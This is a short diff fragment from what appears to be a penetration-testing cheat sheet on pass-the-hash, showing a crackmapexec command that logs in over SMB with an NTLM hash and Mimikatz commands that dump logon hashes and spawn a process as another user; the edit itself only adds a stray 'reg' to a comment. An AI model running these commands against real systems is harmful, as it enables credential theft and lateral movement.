@@ -261,7 +261,7 @@ $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami"
 
 OPTH via. COMPROMISED HOST
 ```powershell
-### WITH MIMIKATZ ON COMPROMISED HOST
+### WITH MIMIKATZ ON COMPROMISED HOSTreg
 mimikatz > sekurlsa::logonpasswords    # obtain NTLM hash
 mimikatz > sekurlsa::pth               # create new PS process in context of target user
         /user:[user_name] 
